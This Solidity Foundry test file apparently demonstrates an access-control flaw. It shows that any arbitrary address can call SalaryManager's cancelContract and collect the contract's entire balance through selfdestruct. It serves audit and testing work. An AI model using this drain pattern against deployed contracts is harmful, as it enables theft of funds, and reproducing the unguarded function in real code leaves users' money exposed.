
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {SalaryManager} from "../src/SalaryManager.sol";

contract TestAccessControlSalaryManager is Test {
    SalaryManager public _contractUnderTest;

    function setUp() public {
        _contractUnderTest = new SalaryManager();
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        // --- 1. Constraints ---
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm));
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // Exclude the owner to prove arbitrary access.
        // Since the test contract deployed SalaryManager, address(this) is the owner.
        // We have already excluded address(this) above.

        // --- 2. State Configuration ---
        // The cancelContract function requires: _totalAllocated < address(this).balance
        // _totalAllocated is 0 initially. We need to fund the contract to pass the check.
        // We use vm.deal to increase balance without increasing _totalAllocated.
        uint256 contractFunds = 10 ether;
        vm.deal(address(_contractUnderTest), contractFunds);

        // Capture caller's balance before execution
        uint256 preBalance = caller.balance;

        // --- 3. Execution & Assertion ---
        vm.prank(caller);
        _contractUnderTest.cancelContract();

        // Assert that the caller received the contract's funds (side effect of selfdestruct)
        assertEq(caller.balance, preBalance + contractFunds);
    }
}
